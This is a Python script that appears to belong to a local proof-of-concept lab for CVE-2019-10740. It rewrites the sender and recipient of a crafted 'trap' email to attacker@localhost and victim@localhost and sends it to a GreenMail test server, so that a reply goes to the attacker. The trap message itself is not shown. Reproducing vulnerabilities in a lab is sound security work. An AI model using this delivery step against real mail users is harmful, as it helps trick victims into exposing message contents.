#!/usr/bin/env python3
"""Inject the crafted trap .eml into GreenMail via SMTP (demo addresses)."""

import argparse
import re
import smtplib
import sys


def rewrite_demo_addresses(data: bytes) -> bytes:
    """Set From/To so Reply goes to attacker@localhost."""
    text = data.decode("utf-8", errors="replace")
    lines = text.splitlines(keepends=True)
    out = []
    for line in lines:
        if re.match(r"(?i)^from:\s*", line):
            out.append("From: attacker@localhost\r\n")
        elif re.match(r"(?i)^to:\s*", line):
            out.append("To: victim@localhost\r\n")
        else:
            out.append(line if line.endswith("\r\n") else line.replace("\n", "\r\n"))
    return "".join(out).encode("utf-8")


def main() -> int:
    p = argparse.ArgumentParser(description="Send trap .eml to GreenMail SMTP")
    p.add_argument("eml", help="Path to cve_2019_10740_trap.eml")
    p.add_argument("--host", default="127.0.0.1", help="SMTP host")
    p.add_argument("--port", type=int, default=3025, help="SMTP port")
    args = p.parse_args()

    with open(args.eml, "rb") as f:
        raw = f.read()
    payload = rewrite_demo_addresses(raw)

    with smtplib.SMTP(args.host, args.port) as smtp:
        smtp.sendmail("attacker@localhost", ["victim@localhost"], payload)
    print(f"Sent trap message to victim@localhost via {args.host}:{args.port}", file=sys.stderr)
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
